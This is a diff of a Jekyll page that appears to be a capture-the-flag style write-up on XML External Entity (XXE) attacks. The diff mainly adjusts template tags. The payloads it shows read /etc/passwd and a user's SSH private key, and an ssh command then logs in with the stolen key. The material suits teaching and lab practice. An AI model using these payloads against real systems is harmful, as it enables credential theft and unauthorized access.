@@ -168,14 +168,14 @@ The type of elements in `note.dtd` file is as below.
 #PCDATA - Parseable Character DATA{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Example `note.xml` file referring to `note.dtd`.
-{% raw %}<?xml version="1.0" encoding="UTF-8"?>
+{% capture code %}{% raw %}<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE note SYSTEM "note.dtd">
 <note>
     <to>falcon</to>
     <from>feast</from>
     <heading>hacking</heading>
     <body>XXE attack</body>
-</note>{% endraw %}
+</note>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml" highlighter="syntax" %}
 
 
 ## Task 15 - [Severity 4] XML External Entity - XXE Payload
@@ -195,14 +195,14 @@ Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds{% endraw %}{% endcap
 
 Use `firefox` to load url `http://<ip>` and try the below payloads.
 
-{% capture code %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+{% capture code %}{% raw %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
     <userInfo>
         <firstName>falcon</firstName>
-        <lastName>&amp;name;</lastName>
-    </userInfo>{% endcapture %} {% include code.html code=code lang="xml"%}
+        <lastName>&name;</lastName>
+    </userInfo>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml"%}
 
-{% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&amp;read;</root>{% endcapture %} {% include code.html code=code lang="xml"%}
+{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml"%}
 
 The first payload will display `falcon feast` and the second payload will display contents of system file `/etc/passwd`.
 
@@ -212,12 +212,12 @@ The first payload will display `falcon feast` and the second payload will displa
 Use `firefox` to load the url `http://<ip>`
 
 Use the following payloads to get the contents of `/etc/passwd`.
-{% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&amp;read;</root>{% endcapture %} {% include code.html code=code lang="xml"%}
+{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml"%}
 
 There is one non-system user. Use the following payload to read the user's rsa private key.
-{% raw %}{% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
-<root>&amp;read;</root>{% endcapture %}{% endraw %} {% include code.html code=code lang="xml"%}
+{% capture code %}{% raw %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
+<root>&read;</root>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml"%}
 
 Copy the contents of payload output to new file. Change the permission of the file to be more stricter, like `chmod 400 <user>_id_rsa` and use `ssh` to login to the machine using downloaded user's ssh private key.
 {% capture code %}{% raw %}ssh -i <user>_id_rsa <user>@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
